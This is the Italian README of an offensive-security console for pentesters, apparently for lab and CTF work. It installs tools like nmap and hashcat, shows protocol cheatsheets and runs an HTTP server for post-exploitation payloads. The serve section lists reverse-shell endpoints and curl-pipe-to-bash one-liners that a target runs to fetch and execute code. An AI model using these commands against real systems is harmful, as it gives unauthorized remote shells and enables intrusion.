# SeaLion Console

```
                                                     .====-:.
                                                  .==-###==+.:--
                                                 +.-*#%%*=:.:+%@*=
                                                *-++++*+===+#%%@*:.
                                                =+*++++-+#%*%#*. ..
                                                ++++*#*%#%%#*#+   .
                                               .++==+*-=#@@@%#*
                                               +++===-=+####%#*
                                             ===+=======+*####*
                                           .+=--=====++++***##+
                                         :=++=-----===+****##*+
                                    --+==++==========++***##**:
                           .====++++***-+*+==++++++++***####*=.
                       -*+********##*+=*#**+++******####%##+==.
                     ##########%####+=*######****#########*=+=
                   *%%###%%%%%%%%%%*=*%%###############%#*++=
                  +**#*+*##%%%%%%#**-%%%%%##########%%###*==#
                 #@@@@%#*+**#####**+*%@%@@@%%%####%%%##*#%@@#
               .***@@@  =+++**####%##@@%@@@@%%%%%%###*%@@@@@#
               ####%#@=      *+++*%#%@%%@@@@@%%%####+  =##@@#
               ##+-# %           %@@@@%%@@@@@@%*          *@%#
                              =%%#%@@%*@*                   .%%%#*+=-..
                           .#%@%######@+
                        -*#######%@%:
                    =###%%%+.
```

**Personal tool vault per pentester.** Console interattiva per gestire, installare e consultare tool di sicurezza offensiva, servire payload di post-exploitation e consultare cheatsheet per protocolli vulnerabili.

---

## Installazione

```bash
git clone https://github.com/Starlix27/SeaLion.git
cd SeaLion
bash setup.sh
```

`setup.sh` crea i comandi `slconsole` e `sealsay` in `~/.local/bin/` e aggiorna il PATH. Installa anche `chafa` se mancante.

Per applicare subito senza riaprire il terminale:

```bash
source ~/.bashrc
```

**Requisiti:** Python 3.10+, Linux (WSL supportato). `chafa` per animazione Ctrl+C (installato automaticamente). `rich` opzionale per rendering Markdown migliorato (`pip install rich`).

**Auto-update:** all'avvio slconsole si sincronizza automaticamente con il repository remoto. Se ci sono aggiornamenti, vengono applicati subito senza intervento manuale.

---

## Utilizzo

```bash
slconsole              # Avvia la console interattiva
sealsay "ciao"        # Stampa un messaggio con il sealion ASCII art
slconsole list         # Elenca i tool disponibili
slconsole search <q>   # Cerca tool per nome o descrizione
slconsole vuln smb     # Cheatsheet vulnerabilità SMB
slconsole vuln list    # Elenca tutti i protocolli per categoria
slconsole --version    # Versione
```

### Console interattiva

```
slconsole> list                   # Mostra tutti i tool
slconsole> search scanner         # Ricerca full-text
slconsole> use nmap               # Seleziona un tool
slconsole(nmap)> install          # Installa il tool selezionato
slconsole> vuln ftp               # Cheatsheet FTP
slconsole> vuln list              # Elenca protocolli per categoria
slconsole> notes <argomento>      # Guide e appunti
slconsole> find <parola>          # Cerca in vuln, tool e notes
slconsole> serve on               # Avvia il server HTTP di delivery
slconsole> serve list             # Mostra file serviti con curl
slconsole> back                   # Torna alla console principale
```

| Tasto | Azione |
|-------|--------|
| **ESC ESC** | Esci da slconsole |
| **Ctrl+C** | Animazione ~spin~ (premi di nuovo per fermarla) |
| **Freccia Su/Giu** | Naviga la cronologia comandi |
| **Tab** | Autocompletamento comandi |

---

## Quick-Delivery Server (`serve`)

Server HTTP in background per post-exploitation. Serve payload dinamici e file statici dalla cartella `static/`, pronti da scaricare via `curl` dal target.

```
slconsole> serve on                          # Avvia (seleziona interfaccia di rete)
slconsole> serve on --port 9090 --lport 4444 # Porta e LPORT custom
slconsole> serve off                         # Arresta
slconsole> serve status                      # Stato corrente
slconsole> serve fetch                       # Scarica tool di post-exploitation in static/
slconsole> serve list                        # Elenca file con comandi curl pronti
slconsole> serve help                        # Documentazione completa
```

### Endpoint dinamici

| Endpoint | Curl |
|----------|------|
| `/upgrade` | `curl http://<IP>:8000/upgrade \| bash` — upgrade shell (socat/python pty) |
| `/rev` | `curl http://<IP>:8000/rev \| bash` — reverse shell Bash |
| `/sh` | `curl http://<IP>:8000/sh \| bash` — reverse shell Python |

### File statici

Qualsiasi file messo nella cartella `static/` viene automaticamente servito e mostrato in `serve list` e `serve on` con il comando curl corretto:
- `.sh` → `curl http://<IP>:8000/file.sh | bash`
- `.exe` → `curl http://<IP>:8000/file.exe -o file.exe`
- binari → `curl http://<IP>:8000/file -o file && chmod +x file`

Usa `serve fetch` per scaricare automaticamente linpeas, winpeas, pspy, linenum e altri.

---

## Tool inclusi (33)

| Categoria | Tool |
|-----------|------|
| **Ricognizione & OSINT** | nmap, shodan, theHarvester, recon-ng, finalrecon, whois |
| **DNS & Web Fuzzing** | dnsenum, gobuster, nikto, scrapy, nuclei |
| **Enumerazione Servizi** | enum4linux-ng, smbmap, crackmapexec/netexec, onesixtyone, braa, ssh-audit, rdp-sec-check |
| **Accesso Remoto & Post-Exploitation** | evil-winrm, impacket, odat, xfreerdp |
| **Password Cracking & Wordlist** | john, hashcat, hashid, hydra, cewl, seclists, htb-wordlists |
| **Web Application** | wafw00f |
| **Framework** | msfconsole |
| **Altro** | basics |

---

## Protocolli vulnerabili (`vuln`) — 15

| Categoria | Protocolli |
|-----------|-----------|
| **Trasferimento File** | ftp, smb, nfs |
| **DNS & Ricognizione** | dns |
| **Email** | smtp, imap-pop3 |
| **Monitoraggio Rete** | snmp |
| **Database** | mysql, mssql, oracle-tns |
| **Accesso Remoto** | ssh, rdp, winrm, wmi |
| **Hardware & Management** | ipmi |

Ogni cheatsheet include: descrizione, porte, vulnerabilità comuni, comandi di enumerazione e tool consigliati.

---

## Aggiungere contenuti

### Nuovo tool

Crea una sottocartella in `tool/` con due file:

```
tool/mio-tool/
├── help.md        # Documentazione in Markdown
└── install.py     # Script di installazione
```

Il tool apparira automaticamente in `slconsole list`.

### Nuovo protocollo vulnerabile

Crea un file `.md` in `vuln/`:

```
vuln/mio-protocollo.md
```

### File statici per il server

Metti qualsiasi file nella cartella `static/` — apparira automaticamente in `serve list` e sara servito dal Quick-Delivery Server.

---

## Struttura del progetto

```
SeaLion/
├── sealion.py          # Console principale
├── http_server.py      # Quick-Delivery Server HTTP
├── setup.sh            # Installer (crea comandi slconsole e sealsay)
├── pyproject.toml      # Metadata pacchetto
├── ascii-art.txt       # Logo ASCII
├── README.md
│
├── tool/               # 33 tool — ogni sottocartella contiene:
│   ├── nmap/
│   │   ├── help.md     #   documentazione
│   │   └── install.py  #   script di installazione
│   └── ...
│
├── vuln/               # 15 protocolli — un file .md per ognuno
│   ├── ftp.md
│   ├── smb.md
│   └── ...
│
├── static/             # File serviti dal Quick-Delivery Server
│   ├── linpeas.sh
│   ├── pspy64
│   └── ...
│
└── assets/             # Risorse (GIF, immagini)
    └── spinning.gif
```

